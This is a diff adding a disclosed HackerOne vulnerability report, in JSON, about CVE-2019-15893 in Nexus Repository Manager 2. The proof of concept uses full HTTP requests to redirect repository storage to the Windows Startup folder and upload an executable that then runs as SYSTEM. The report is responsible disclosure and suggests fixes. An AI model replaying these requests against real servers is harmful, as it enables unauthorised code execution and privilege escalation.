@@ -1,0 +1,162 @@
+{
+  "id": 683965,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82ODM5NjU=",
+  "url": "https://hackerone.com/reports/683965",
+  "title": "Unrestricted File Upload Leading to Remote Code Execution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-08-28T18:42:12.237Z",
+  "submitted_at": "2019-08-28T18:42:12.237Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hland",
+    "url": "/hland",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/043/303/e1c7388bb5caea88c569aeeeb069571590c50037_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35524,
+    "url": "https://hackerone.com/central-security-project",
+    "handle": "central-security-project",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Central Security Project",
+      "twitter_handle": "",
+      "website": "https://www.sonatype.com/central-security-project",
+      "about": "Ensuring Safer Open Source Across Ecosystems"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-15893"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-10-30T20:05:22.210Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-10-30T20:05:22.148Z",
+  "team_member_agreed_on_going_public_at": "2019-10-28T18:58:23.805Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Description\nAs an administrator user it is possible to create files and directories in any location on the file system of the server. This can be abused to write files to any sensitive location on the Windows file system because the Nexus process runs with SYSTEM privileges. This can allows an attacker that is able to break into the Nexus Repository Manager to elevate privileges to SYSTEM on the server and use it as pivoting point for lateral movement during an attack.\n\nIn the proof-of-concept I upload a PE executable file to the user's Windows Startup Folder, achieving remote code execution the next time the user logs in. In my example simply executing calc.exe. \n\nThe tests were done with an installation of Nexus Repository Manager OSS 2.14.9-01 on Microsoft Windows Server 2016 Datacenter 10.0.14393 N/A Build 1439.\n\n### Additional Details\nUnfortunately I was unable to dig up the functions handling these HTTP requests.\n\n## Steps to reproduce:\n1. Create a repo and set the \"overrideLocalStorageUrl\" to a folder two levels below the one you want to write files to.\n\n`POST /nexus/service/local/repositories`\n\n2. Upload a file to a directory of your choice by manipulating the \"g\", \"a\" and \"v\" parameters\n\n`POST /nexus/service/local/artifact/maven/content`\n\n\n### Proof-Of-Concept\n\n1. Create repository:\n\n```\nPOST /nexus/service/local/repositories HTTP/1.1\nHost: nexus-host\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json\nX-Nexus-UI: true\nContent-Length: 443\nConnection: close\nCookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770\n\n{\"data\":{\"repoType\":\"hosted\",\"id\":\"5000\",\"name\":\"MyTestRepo\",\"writePolicy\":\"ALLOW_WRITE_ONCE\",\"browseable\":true,\"indexable\":true,\"exposed\":true,\"notFoundCacheTTL\":1440,\"repoPolicy\":\"RELEASE\",\"provider\":\"maven2\",\"providerRole\":\"org.sonatype.nexus.proxy.repository.Repository\",\"overrideLocalStorageUrl\":\"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu\",\"downloadRemoteIndexes\":false,\"checksumPolicy\":\"IGNORE\"}}\n\nHTTP/1.1 201 Created\nDate: Wed, 28 Aug 2019 16:58:53 GMT\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nServer: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8\nContent-Type: application/json; charset=UTF-8\nContent-Length: 638\nConnection: close\n\n{\"data\":{\"contentResourceURI\":\"http://<redacted>/nexus/content/repositories/5000\",\"id\":\"5000\",\"name\":\"MyTestRepo\",\"provider\":\"maven2\",\"providerRole\":\"org.sonatype.nexus.proxy.repository.Repository\",\"format\":\"maven2\",\"repoType\":\"hosted\",\"exposed\":true,\"writePolicy\":\"ALLOW_WRITE_ONCE\",\"browseable\":true,\"indexable\":true,\"notFoundCacheTTL\":1440,\"repoPolicy\":\"RELEASE\",\"downloadRemoteIndexes\":false,\"overrideLocalStorageUrl\":\"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu\",\"defaultLocalStorageUrl\":\"file:/C:/Users/myuser/Desktop/nexus-2.14.9-01-bundle/sonatype-work/nexus/storage/5000\"}}\n```\n\n2. Upload file\n\n```\nPOST /nexus/service/local/artifact/maven/content HTTP/1.1\nHost: nexus-host\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269\nContent-Length: 33250\nConnection: close\nCookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770\nUpgrade-Insecure-Requests: 1\n\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"r\"\n\n5000\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"g\"\n\nPrograms\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"a\"\n\nStartup\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"v\"\n\n.\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"p\"\n\njar\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"c\"\n\n\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"e\"\n\nexe\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"file\"; filename=\"calc.exe\"\nContent-Type: text/html\n\n<insert_content_of_calc.exe>\n-----------------------------103850373015325909411337083269--\n\n\nHTTP/1.1 201 Created\nDate: Wed, 28 Aug 2019 17:05:47 GMT\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nServer: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8\nContent-Type: text/html;charset=UTF-8\nContent-Length: 77\nConnection: close\n\n{\"groupId\":\"Programs\",\"artifactId\":\"Startup\",\"version\":\".\",\"packaging\":\"jar\"}\n```\n\n## Patch\nThere are multiple ways to fix this:\n\n1. Make it the default to run Nexus Repository Manager as a less privileged user. \n2. Restrict the locations on the filesystem that Nexus Repository Manager can write to.\n\n## Additional details\n\n* OS Name:                   Microsoft Windows Server 2016 Datacenter\n* OS Version:                10.0.14393 N/A Build 14393\n\n* java version \"1.8.0_211\"\nJava(TM) SE Runtime Environment (build 1.8.0_211-b12)\nJava HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)\n\n# Wrap up\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\nMy reaction when uploading files to any location on the filesystem:\nhttps://66.media.tumblr.com/463873f43d1b6c3ae34ab817fe92e0a2/tumblr_inline_omgbhw31qa1qar3or_500.gif\n\n## Impact\n\nThe attacker could run arbitrary code on the server as the SYSTEM user.",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-11-27T18:58:23.872Z",
+  "allow_singular_disclosure_after": -203458956.88380784,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "christianaugust",
+    "tess",
+    "mohaned0101",
+    "spam404",
+    "dhakal_ananda",
+    "thalaivar304",
+    "term1nal",
+    "0xm1racle",
+    "g1ng",
+    "1_demotemp",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 17122,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Java Component in search.maven.org",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 18673,
+      "category": "team",
+      "content": "https://support.sonatype.com/hc/en-us/articles/360035055794-CVE-2019-15893-Nexus-Repository-Manager-2-Remote-Code-Execution-2019-09-03",
+      "updated_at": "2019-10-28T14:51:09.188Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 429706,
+        "username": "acazzolla",
+        "name": "Adam Cazzolla",
+        "bio": null,
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": null,
+        "created_at": "2018-12-07T21:38:26.465Z",
+        "url": "https://hackerone.com/acazzolla",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
